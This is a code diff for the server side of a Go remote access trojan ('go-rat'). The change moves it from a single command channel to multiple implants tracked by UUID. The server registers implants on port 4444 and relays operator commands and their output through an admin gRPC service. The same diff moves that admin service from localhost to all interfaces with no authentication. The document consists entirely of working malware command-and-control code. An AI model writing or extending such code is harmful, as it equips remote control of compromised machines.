@@ -3,46 +3,65 @@ package main
 import (
 	"context"
 	"errors"
-	"fmt"
+	"github.com/google/uuid"
 	"github.com/iortego42/go-rat/grpcapi"
 	"github.com/iortego42/go-rat/log"
 	"google.golang.org/grpc"
 	"net"
 )
 
-var logger = log.InitLogger()
+type session struct {
+	in  chan *grpcapi.Command
+	out chan *grpcapi.Command
+}
 
 type implantServer struct {
-	work, output chan *grpcapi.Command
+	//implants map[uuid.UUID]session
 	grpcapi.ImplantServer
 }
 
 type adminServer struct {
-	work, output chan *grpcapi.Command
+	//work, output chan *grpcapi.Command
 	grpcapi.AdminServer
 }
 
-func newImplantServer(work, output chan *grpcapi.Command) *implantServer {
+var logger = log.InitLogger()
+var implants map[uuid.UUID]*session = make(map[uuid.UUID]*session)
+
+func newImplantServer() *implantServer {
 	s := new(implantServer)
-	s.work = work
-	s.output = output
+	//s.work = work
+	//s.output = output
 	return s
 }
 
 func newAdminServer(work, output chan *grpcapi.Command) *adminServer {
 	s := new(adminServer)
-	s.work = work
-	s.output = output
+	//s.work = work
+	//s.output = output
 	return s
 }
 
-func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
-	cmd := new(grpcapi.Command)
+func (s *implantServer) RegisterImplant(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Identity, error) {
+	if identity != nil && len(identity.Id) > 0 && implants[uuid.MustParse(identity.Id)] != nil {
+		logger.Debug("Connected", "UUID", identity.Id)
+		return identity, nil
+	}
+	id := uuid.New()
+	identity.Id = id.String()
+	implants[id] = &session{make(chan *grpcapi.Command), make(chan *grpcapi.Command)}
+	logger.Debug("New Implant", "UUID", identity.Id)
+	return identity, nil
+}
+
+func (s *implantServer) FetchCommand(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Command, error) {
+	var cmd = new(grpcapi.Command)
 
 	select {
-	case cmd, ok := <-s.work:
-		logger.Debug("Comando recibido del administrador.", "CMD", cmd.In)
+	case cmd, ok := <-implants[uuid.MustParse(identity.Id)].in:
+		logger.Debug("Comando recibido.", "CMD", cmd.In, "Implant", identity.Name)
 		if ok {
+			cmd.Id = identity.Id
 			return cmd, nil
 		}
 		return cmd, errors.New("channel closed")
@@ -52,18 +71,19 @@ func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) 
 }
 
 func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
-	s.output <- result
+	implants[uuid.MustParse(result.Id)].out <- result
 	logger.Debug("Resultado enviado al administrador.")
 	return &grpcapi.Empty{}, nil
 }
 
 func (s *adminServer) RunCommand(ctx context.Context, command *grpcapi.Command) (*grpcapi.Command, error) {
 	var res *grpcapi.Command
+	var id = uuid.MustParse(command.Id)
 	go func() {
-		s.work <- command
+		implants[id].in <- command
 	}()
 	logger.Debug("Enviado comando al Servidor.", "CMD", command.In)
-	res = <-s.output
+	res = <-implants[id].out
 	logger.Debug("Resultado recibido.")
 	return res, nil
 }
@@ -75,17 +95,18 @@ func main() {
 		opts                           []grpc.ServerOption
 		work, output                   chan *grpcapi.Command
 	)
+	logger.SetLevel(log.DebugLevel)
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
-	implant := newImplantServer(work, output)
+	implant := newImplantServer()
 	admin := newAdminServer(work, output)
-	client_addr := ":9090"
-	implant_addr := ":4444"
-	if implantListener, err = net.Listen("tcp", implant_addr); err != nil {
+	clientAddr := ":9090"
+	implantAddr := ":4444"
+	if implantListener, err = net.Listen("tcp", implantAddr); err != nil {
 		logger.Debug(implantListener)
 		logger.Fatal("Error en el listener del implant", "ERROR", err)
 	}
 
-	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
+	if adminListener, err = net.Listen("tcp", clientAddr); err != nil {
 		logger.Debug(adminListener)
 		logger.Fatal("Error en el listener del admin", "ERROR", err)
 	}
@@ -104,16 +125,15 @@ func main() {
 	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
 	go func() {
-		logger.Infof("ImplantListener escuchando en %s", implant_addr)
+		logger.Infof("ImplantListener escuchando en %s", implantAddr)
 		err = grpcImplantServer.Serve(implantListener)
 		if err != nil {
 			logger.Fatal(err)
 		}
 	}()
-	logger.Infof("AdminListener escuchando en %s", client_addr)
+	logger.Infof("AdminListener escuchando en %s", clientAddr)
 	err = grpcAdminServer.Serve(adminListener)
 	if err != nil {
 		logger.Fatal(err)
 	}
-
 }
